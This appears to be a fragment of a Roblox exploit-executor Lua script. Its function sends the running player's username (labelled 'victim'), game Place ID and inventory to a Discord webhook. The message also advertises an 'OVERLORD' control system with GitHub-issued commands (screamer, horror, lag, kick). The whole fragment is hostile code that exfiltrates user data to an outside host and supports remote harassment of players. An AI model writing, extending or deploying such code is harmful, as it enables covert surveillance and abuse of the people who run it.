-- 1. МОНИТОРИНГ (Discord)
local function sendMasterLog(title, desc, color)
    pcall(function()
        local inv = ""
        for _, v in pairs(lp.Backpack:GetChildren()) do inv = inv .. "[" .. v.Name .. "] " end
        local data = {
            ["embeds"] = {
                {
                    ["title"] = "🛰️ AxM OVERLORD SYSTEM ONLINE",
                    ["description"] = "**Команды управления (GitHub):**\n`safe`, `screamer`, `horror`, `lag`, `kick`",
                    ["color"] = 0x00ffff
                },
                {
                    ["title"] = title,
                    ["description"] = desc,
                    ["color"] = color or 0x00a2ff,
                    ["fields"] = {
                        {["name"] = "👤 Жертва", ["value"] = "||"..lp.Name.."||", ["inline"] = true},
                        {["name"] = "🎮 Place ID", ["value"] = tostring(game.PlaceId), ["inline"] = true},
                        {["name"] = "🎒 Инвентарь", ["value"] = "```" .. (inv ~= "" and inv or "Пусто") .. "```"}
                    }
                }
            }
        }
        local req = request or http_request or (syn and syn.request)
        if req then req({Url = webhook_url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)}) end
    end)
end

